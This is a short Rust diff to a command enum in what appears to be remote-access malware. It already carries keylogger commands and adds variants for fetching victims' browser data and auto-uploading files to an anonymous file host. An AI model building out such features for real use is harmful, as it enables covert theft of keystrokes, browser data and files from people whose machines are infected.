@@ -107,4 +107,7 @@ pub enum ServerCommand {
     ClearOfflineLogs(SocketAddr),
     KeyloggerUpdate(SocketAddr, KeyloggerUpdate),
     KeyloggerOfflineLogs(SocketAddr, Vec<String>),
+    GetBrowserData(SocketAddr),
+    BrowserData(SocketAddr, BrowserData),
+    SetAutoUploadAnonFiles(bool),
 }
